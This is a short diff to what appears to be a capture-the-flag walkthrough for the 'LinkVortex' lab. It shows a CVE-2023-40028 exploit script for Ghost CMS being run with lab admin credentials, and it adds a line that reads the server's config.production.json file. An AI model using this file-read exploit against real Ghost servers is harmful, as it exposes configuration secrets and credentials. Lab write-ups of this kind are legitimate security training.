@@ -102,6 +102,7 @@ $ vi CVE-2023-40028.sh
 ```
 $ chmod +x CVE-2023-40028.sh
 $ ./CVE-2023-40028.sh -u admin@linkvortex.htb -p OctopiFociPilfer45
+file> /var/lib/ghost/config.production.json
 ```
 ![在地球上的白天](images/082513.png)
 ![在地球上的白天](images/082514.png)
